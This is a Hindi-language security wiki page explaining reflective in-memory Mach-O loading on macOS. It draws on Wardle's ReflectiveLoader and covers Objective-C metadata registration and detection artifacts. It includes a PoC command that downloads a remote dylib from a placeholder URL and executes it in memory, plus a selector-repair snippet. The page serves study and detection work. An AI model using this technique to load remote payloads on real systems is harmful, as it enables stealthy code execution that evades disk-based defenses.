# macOS पर Reflective Mach-O Loading

{{#include ../../../banners/hacktricks-training.md}}

Reflective loader अपने ही process में पहले से मौजूद bytes से Mach-O image map करता है, फिर payload file खोलने के लिए system loader से कहे बिना उसे link करता है और उसके initializers चलाता है। यह **in-process code execution** है, privilege escalation या remote-process injection primitive नहीं।<sup>[[2]](#references)</sup>

हाल के macOS versions में, पुराना `NSCreateObjectFileImageFromMemory`/`NSLinkModule` path image को disk पर लिखता है। ReflectiveLoader में इसके बजाय Apple का पुराना dyld loading code शामिल है; Wardle ने macOS 15 और 26 पर इसे प्रदर्शित किया।<sup>[[2]](#references)[[3]](#references)</sup>

यदि loader Hardened Runtime का उपयोग करता है, तो unsigned in-memory code के लिए `com.apple.security.cs.allow-unsigned-executable-memory` या `com.apple.security.cs.disable-executable-page-protection` जैसी executable-memory exception चाहिए; अन्यथा code-signing enforcement execution को रोक देता है। यह loader की signing constraint है, elevation primitive नहीं। [macOS entitlements reference](../macos-security-protections/macos-dangerous-entitlements.md#comapplesecuritycsallow-unsigned-executable-memory) देखें।<sup>[[2]](#references)</sup>

PoC के लिए ऐसा URL दें जो raw Mach-O **bundle, framework, या dylib** serve करता हो। इसका `main.mm` खाली downloads को अस्वीकार करता है और बताता है कि `LC_DYLD_CHAINED_FIXUPS` का उपयोग करने वाले payloads समर्थित नहीं हैं। Local pathname भी स्वीकार किया जाता है, लेकिन यह input fileless workflow नहीं है। URL वाला तरीका bytes को `NSData` में पढ़ता है और उसका buffer तथा length `custom_dlopen_from_memory` को देता है।<sup>[[4]](#references)</sup>

```bash
./PoC 'https://example.invalid/payload.dylib'
```

Embedded loader `ImageLoaderMachO::instantiateFromMemory` को कॉल करता है, फिर `image->link` को। यह `image->runInitializers` चलाने से पहले, linking के बाद Objective-C metadata register करता है; यह constructors execute करता है।<sup>[[5]](#references)</sup> Registration के बिना, Objective-C message भेजने वाला constructor `unrecognized selector sent to instance` error के साथ fail हो सकता है।<sup>[[3]](#references)</sup> [dyld के सामान्य image-loading flow](macos-library-injection/macos-dyld-process.md#flow) और [Mach-O sections reference](../macos-files-folders-and-binaries/universal-binaries-and-mach-o-format.md#objective-c-common-sections) देखें।

## Objective-C metadata सक्रिय करना

सामान्य dyld loading के विपरीत, पुराने image loader को embed करने से payload का Objective-C metadata अपने-आप `libobjc` के लिए usable नहीं हो जाता।<sup>[[3]](#references)</sup> अनुकूलित LLVM JIT approach, mapped `__DATA` और `__DATA_CONST` Objective-C sections को scan करता है, फिर constructors चलने से पहले ये steps पूरे करता है:<sup>[[1]](#references)[[5]](#references)[[6]](#references)</sup>

1. `sizeof(SEL)` के steps में `__objc_selrefs` को traverse करें। प्रत्येक non-null selector का नाम `sel_getName` से प्राप्त करें, उसे `sel_registerName` में pass करें और section के pointer को canonical `SEL` से replace करें।
2. `__objc_classlist` से classes collect करें और उन्हें `objc_readClassPair` से register करें; पहले superclass dependencies resolve करें।
3. `__objc_classrefs` और `__objc_superrefs` में references को registered classes या metaclasses से rewrite करें, और `__objc_catlist` से category methods attach करें।

उदाहरण के लिए, `ObjCRuntime.cpp` में selector repair इसके equivalent है:<sup>[[6]](#references)</sup>

```objectivec
for (uint8_t *cursor = sectionStart;
     cursor < sectionStart + selRefsSectionSize;
     cursor += sizeof(SEL)) {
    SEL *selector = (SEL *)cursor;
    if (*selector == NULL) continue;
    *selector = sel_registerName(sel_getName(*selector));
}
```

PoC आंतरिक Objective-C runtime व्यवहार पर निर्भर करता है और Mach-O format की हर सुविधा का समर्थन नहीं करता, इसलिए इसका registration code एक implementation reference है, generic drop-in loader नहीं।<sup>[[1]](#references)[[4]](#references)[[6]](#references)</sup> Payload द्वारा परिभाषित classes के साथ-साथ संदर्भित Apple classes और methods के लिए भी registration आवश्यक है।<sup>[[3]](#references)</sup>

लेखक के परीक्षणों में reflectively loaded image, `dyld_all_image_infos` में दिखाई नहीं देता। इसके anonymous executable mappings, `vmmap` में unnamed `dylib` regions के रूप में दिखाई दे सकते हैं; sampled frames को `<unknown binary>` के रूप में दिखाया जा सकता है। ये निरीक्षण के संकेत हैं, इस loader से विश्वसनीय attribution नहीं; और किसी अन्य process की task जानकारी तक पहुंच entitlement-सीमित है। Process access की सीमाओं के लिए [macOS memory dumping](../macos-files-folders-and-binaries/macos-memory-dumping.md) देखें।<sup>[[3]](#references)</sup>

## References

- [1] [macOS पर LLVM JIT, Objective-C और Swift: ज्ञान-संग्रह](https://stanislaw.github.io/2018-09-03-llvm-jit-objc-and-swift-knowledge-dump.html)
- [2] [macOS पर Reflective Code Loading को फिर से सक्षम करना (भाग I)](https://objective-see.org/blog/blog_0x7C.html)
- [3] [macOS पर Reflective Code Loading को फिर से सक्षम करना (भाग II)](https://objective-see.org/blog/blog_0x82.html)
- [4] [ReflectiveLoader PoC main.mm](https://github.com/pwardle/ReflectiveLoader/blob/main/PoC/PoC/main.mm)
- [5] [ReflectiveLoader custom_dlfcn.cpp](https://github.com/pwardle/ReflectiveLoader/blob/main/loader/src/custom_dlfcn.cpp)
- [6] [ReflectiveLoader ObjCRuntime.cpp](https://github.com/pwardle/ReflectiveLoader/blob/main/loader/src/ObjCRuntime.cpp)
